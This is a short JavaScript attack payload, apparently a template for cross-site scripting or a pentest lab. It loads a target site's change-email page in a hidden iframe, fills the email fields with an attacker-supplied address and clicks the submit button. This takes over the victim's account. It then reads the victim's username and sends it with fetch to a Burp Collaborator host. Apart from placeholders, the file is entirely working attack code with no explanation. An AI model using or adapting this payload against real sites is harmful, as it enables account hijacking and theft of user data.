document.addEventListener("DOMContentLoaded", function() {
    buildFrame();
})

function buildFrame() {
    let frame=document.createElement("iframe")
    frame.src="<TARGET-URL>/change-email"
    document.body.append(frame)
    setTimeout(function(){
        frame.contentDocument.getElementById("EmailAddress").value="<YOUR-EMAIL>"
        frame.contentDocument.getElementById("EmailAddressConfirm").value="<YOUR-EMAIL>"
        frame.contentDocument.querySelector("<TARGET-ELEMENT-ID-FOR-BUTTON>").click()
    }, 2000)
    setTimeout(function(){
        let userName=frame.contentDocument.querySelector("<TARGET-ELEMENT-ID-FOR-USERNAME>").textContent
        fetch('<BURP-COLLABORATOR>/?x='+userName)
    }, 5000)
}
